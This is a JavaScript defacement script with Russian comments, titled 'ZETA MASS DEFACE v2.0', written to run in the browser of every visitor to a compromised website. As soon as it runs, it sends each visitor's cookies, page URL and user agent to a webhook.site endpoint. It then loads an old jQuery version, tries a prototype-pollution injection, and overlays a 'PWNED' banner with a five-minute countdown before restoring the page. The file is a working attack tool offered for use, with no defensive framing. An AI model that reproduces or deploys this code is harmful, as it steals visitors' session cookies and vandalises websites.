// === ZETA MASS DEFACE v2.0 ===
// Этот скрипт будет выполняться у всех посетителей сайта

(function() {
    'use strict';
    
    // Настройки
    var DEFACE_DURATION = 300; // 5 минут (300 секунд)
    var WEBHOOK_URL = 'https://webhook.site/ТВОЙ-УНИКАЛЬНЫЙ-URL';
    
    // Проверяем, не был ли уже дефейс (чтобы не задваивать)
    if (sessionStorage.getItem('zeta_defaced')) return;
    sessionStorage.setItem('zeta_defaced', 'true');
    
    // Сообщаем на вебхук, что жертва заражена
    var ping = new Image();
    ping.src = WEBHOOK_URL + '?victim=' + encodeURIComponent(window.location.href) + 
              '&cookie=' + encodeURIComponent(document.cookie) +
              '&userAgent=' + encodeURIComponent(navigator.userAgent) +
              '&timestamp=' + Date.now();
    
    // Сохраняем оригинальный контент (для восстановления если понадобится)
    var originalBody = document.body.innerHTML;
    var originalTitle = document.title;
    var originalHead = document.head.innerHTML;
    
    // ЗАГРУЖАЕМ УЯЗВИМЫЙ jQuery ЕСЛИ НЕТ
    if (typeof jQuery === 'undefined') {
        var jqScript = document.createElement('script');
        jqScript.src = 'https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js';
        jqScript.onload = function() {
            executeDeface();
        };
        document.head.appendChild(jqScript);
    } else {
        executeDeface();
    }
    
    function executeDeface() {
        // Взламываем через Prototype Pollution для закрепления
        if (typeof jQuery !== 'undefined') {
            try {
                jQuery.extend(true, {}, JSON.parse('{"__proto__":{"zetaHacked":"true","adminAccess":true}}'));
            } catch(e) {}
        }
        
        // Меняем заголовок
        document.title = '☠️ PWNED BY ALPHA & ZO | ZETA RULES ☠️';
        
        // Создаём оверлей поверх всего контента (более профессионально)
        var overlay = document.createElement('div');
        overlay.id = 'zeta-overlay';
        overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999999;' +
                               'background:linear-gradient(135deg, #000 0%, #1a0000 50%, #000 100%);' +
                               'display:flex;align-items:center;justify-content:center;flex-direction:column;' +
                               'font-family:monospace;color:#ff0000;text-align:center;';
        
        overlay.innerHTML = `
            <div style="animation:zetaGlitch 0.3s infinite;max-width:800px;padding:20px;">
                <pre style="color:#ff0000;text-shadow:0 0 20px #ff0000;font-size:16px;line-height:1.2;">
 ███████╗███████╗████████╗ █████╗ 
 ╚══███╔╝██╔════╝╚══██╔══╝██╔══██╗
   ███╔╝ █████╗     ██║   ███████║
  ███╔╝  ██╔══╝     ██║   ██╔══██║
 ███████╗███████╗   ██║   ██║  ██║
 ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝
                </pre>
                <h1 style="font-size:70px;text-shadow:0 0 40px #ff0000,0 0 80px #ff0000;margin:20px 0;animation:zetaPulse 1s infinite;">
                    PWNED
                </h1>
                <p style="font-size:30px;color:#ffcc00;text-shadow:0 0 20px #ffcc00;margin:20px 0;">
                    ⚡ Alpha & Zo | Zeta Kingdom ⚡
                </p>
                <p style="font-size:22px;color:#00ff41;text-shadow:0 0 10px #00ff41;">
                    jQuery 1.9.1 Prototype Pollution + XSS
                </p>
                <div style="margin:30px 0;">
                    <img src="https://media.giphy.com/media/3ohhwMDyS6rvjSNF1S/giphy.gif" 
                         style="width:300px;border:3px solid #ff0000;box-shadow:0 0 30px #ff0000;border-radius:10px;">
                </div>
                <div id="zeta-timer" style="font-size:60px;color:#ff0000;text-shadow:0 0 30px #ff0000;font-weight:bold;margin:20px 0;">
                    05:00
                </div>
                <p style="color:#888;font-size:18px;">
                    Самоуничтожение через 5 минут<br>
                    <span style="color:#ff0000;">Hacked by Zeta</span>
                </p>
                <p style="color:#666;font-size:14px;margin-top:30px;">
                    Сайт использует уязвимую версию jQuery 1.9.1<br>
                    CVE-2019-11358 | CVE-2015-9251 | CVE-2020-11023
                </p>
            </div>
        `;
        
        document.body.appendChild(overlay);
        
        // Добавляем стили анимации
        var style = document.createElement('style');
        style.textContent = `
            @keyframes zetaGlitch {
                0% { transform: translate(0); }
                20% { transform: translate(-3px, 3px); }
                40% { transform: translate(3px, -3px); }
                60% { transform: translate(-3px, -3px); }
                80% { transform: translate(3px, 3px); }
                100% { transform: translate(0); }
            }
            @keyframes zetaPulse {
                0%, 100% { transform: scale(1); }
                50% { transform: scale(1.05); }
            }
            @keyframes zetaFadeOut {
                from { opacity: 1; }
                to { opacity: 0; }
            }
        `;
        document.head.appendChild(style);
        
        // Таймер обратного отсчёта
        var timeLeft = DEFACE_DURATION;
        var timerInterval = setInterval(function() {
            timeLeft--;
            var minutes = Math.floor(timeLeft / 60);
            var seconds = timeLeft % 60;
            var timerEl = document.getElementById('zeta-timer');
            if (timerEl) {
                timerEl.textContent = 
                    String(minutes).padStart(2, '0') + ':' + 
                    String(seconds).padStart(2, '0');
            }
            
            // За 30 секунд до конца — предупреждение
            if (timeLeft <= 30 && timerEl) {
                timerEl.style.color = '#ffcc00';
                timerEl.style.animation = 'zetaPulse 0.5s infinite';
            }
            
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                RESTORE();
            }
        }, 1000);
        
        // Функция восстановления
        function RESTORE() {
            var overlay = document.getElementById('zeta-overlay');
            if (overlay) {
                overlay.style.animation = 'zetaFadeOut 1s forwards';
                setTimeout(function() {
                    if (overlay) overlay.remove();
                    sessionStorage.removeItem('zeta_defaced');
                }, 1000);
            }
            document.title = originalTitle;
            
            // Отправляем уведомление о завершении
            var done = new Image();
            done.src = WEBHOOK_URL + '?status=defaced_complete&url=' + encodeURIComponent(window.location.href);
        }
        
        // Ручное отключение (CTRL+SHIFT+Z)
        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.shiftKey && e.key === 'Z') {
                clearInterval(timerInterval);
                RESTORE();
                console.log('ZETA: Ручное восстановление активировано!');
            }
        });
        
        console.log('%c☠️ ZETA DEFACE ACTIVE | Auto-restore in 5 min | CTRL+SHIFT+Z for manual restore',
                    'color:#ff0000;font-size:20px;');
    }
})();